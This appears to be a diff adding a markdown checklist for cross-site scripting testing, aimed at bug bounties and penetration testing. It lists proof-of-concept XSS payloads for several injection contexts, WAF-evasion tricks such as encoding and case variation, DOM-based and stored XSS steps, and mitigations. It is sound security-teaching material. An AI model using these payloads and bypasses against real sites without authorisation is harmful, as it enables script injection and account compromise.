@@ -1,0 +1,145 @@
+## ✅ COMPLETE XSS TESTING CHECKLIST (Step-by-Step)
+
+---
+
+### 📌 **1. Reconnaissance (Information Gathering)**
+
+- [ ] Identify all user input fields:
+  - Search boxes, login forms, comment sections, URL parameters, headers, cookies.
+- [ ] Use tools to find hidden parameters:
+  - Tools: `ParamSpider`, `Burp Suite`, `ffuf`, `gau`, `waybackurls`
+- [ ] Check response content type:
+  - `text/html` indicates XSS possible.
+  - `application/json` may still allow XSS in reflected content.
+
+---
+
+### 🔍 **2. Entry Point Discovery**
+
+- [ ] Check URL parameters:
+  - `example.com/page?name=John`
+- [ ] Inspect POST parameters:
+  - Use Burp or browser DevTools to intercept.
+- [ ] Explore HTTP headers:
+  - User-Agent, Referer, Host, etc.
+- [ ] Inspect hidden fields / HTML comments.
+- [ ] Check JSON/XML responses for reflection points.
+
+---
+
+### 🧪 **3. Reflection Testing**
+
+- [ ] Inject harmless strings:
+  - `test123`, `"><test>`, `'"><script>`
+- [ ] Check how input is reflected in:
+  - HTML body
+  - HTML attribute
+  - JavaScript code block
+  - URL (context matters!)
+- [ ] Determine encoding:
+  - Is `<` converted to `&lt;`?
+
+---
+
+### 🚨 **4. Payload Injection (Based on Context)**
+
+#### 💬 4.1 – **HTML Context**
+- [ ] Payloads:
+  ```html
+  <script>alert(1)</script>
+  <img src=x onerror=alert(1)>
+  <svg onload=alert(1)>
+  ```
+
+#### 🎯 4.2 – **Attribute Context**
+- [ ] Payloads:
+  ```html
+  " onmouseover="alert(1)
+  ' autofocus onfocus=alert(1)
+  ```
+
+#### 📜 4.3 – **JavaScript Context**
+- [ ] Payloads:
+  ```javascript
+  ';alert(1);//
+  ");alert(1);//
+  ```
+
+#### 🔗 4.4 – **URL Context**
+- [ ] Payload:
+  ```html
+  javascript:alert(1)
+  ```
+
+---
+
+### 🛠️ **5. Bypasses & WAF Evasion**
+
+- [ ] Use encoded payloads:
+  - URL-encode (`%3Cscript%3Ealert(1)%3C/script%3E`)
+- [ ] Use case variation:
+  - `<ScRiPt>alert(1)</ScRiPt>`
+- [ ] Use JS event handlers in non-script tags:
+  - `<div onmouseover=alert(1)>hover</div>`
+- [ ] Use `eval()`, `setTimeout`, or backticks in JS:
+  - ```js
+    setTimeout`alert(1)`
+    ```
+
+- [ ] DOM-based bypass:
+  - Modify fragments: `/#<img src=x onerror=alert(1)>`
+
+---
+
+### 🧬 **6. Test for DOM-Based XSS**
+
+- [ ] Check if JavaScript handles user input directly:
+  ```js
+  document.write(location.hash)
+  ```
+- [ ] Tools: `DOM Invader` (PortSwigger), `XSS Hunter`, manual inspection.
+- [ ] Try payloads in hash:
+  - `example.com/#<img src=x onerror=alert(1)>`
+- [ ] Check sinks: `innerHTML`, `document.write`, `eval`, `location.href`
+
+---
+
+### ⚙️ **7. Tool-Based Testing (optional)**
+
+- [ ] Burp Suite (with active scanner)
+- [ ] OWASP ZAP
+- [ ] XSStrike
+- [ ] DalFox
+- [ ] XSS Hunter (for stored XSS detection)
+
+---
+
+### 🧹 **8. Stored XSS Testing**
+
+- [ ] Inject payloads into comments, profile info, messages, etc.
+- [ ] Revisit the page later or view as another user.
+- [ ] Observe if the payload executes from stored data.
+
+---
+
+### 🔐 **9. Mitigation Checklist (Post-Exploitation or Reporting)**
+
+- [ ] Sanitize user input server-side.
+- [ ] Encode output based on context:
+  - HTML encode: `&lt;`, `&gt;`, `&amp;`
+  - Attribute encode
+  - JS escape
+- [ ] Set Content Security Policy (CSP).
+- [ ] Use HTTP-only cookies and SameSite attributes.
+- [ ] Disable inline JS if possible.
+- [ ] Use frameworks that auto-escape (React, Angular).
+
+---
+
+### 🧾 **10. Reporting (for Bug Bounties / VAPT)**
+
+- [ ] Clear explanation of the issue.
+- [ ] Steps to reproduce.
+- [ ] Working payload.
+- [ ] Screenshots or video POC.
+- [ ] Suggested mitigation.
